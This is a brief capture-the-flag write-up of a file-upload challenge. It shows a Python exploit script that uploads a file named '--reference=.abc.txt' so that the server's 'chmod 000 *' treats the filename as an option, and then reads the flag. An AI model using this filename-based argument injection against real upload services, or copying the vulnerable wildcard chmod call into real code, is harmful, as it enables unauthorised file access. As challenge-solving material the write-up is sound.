```shell_exec('chmod 000 *');```
In this * does not include hidden files. So that is a bypass <br>

```
import requests

REMOTE = "http://0.0.0.0:8080/"

res = requests.post(REMOTE, files={"file": (".abc.txt", "ble")})
res = requests.post(REMOTE, files={"file": ("--reference=.abc.txt", "ble")})
res = requests.get(REMOTE + "/uploads/flag.txt")
print(res.text)
```

In this chall, only files with txt extension were allowed by checking the ending chars of the filename. <br>

If we create a file with a name like ```--help``` chmod will interpret as a flag instead of a file. So we use ```--reference=somefile``` that replaces the 000 mode with the perms from somefile
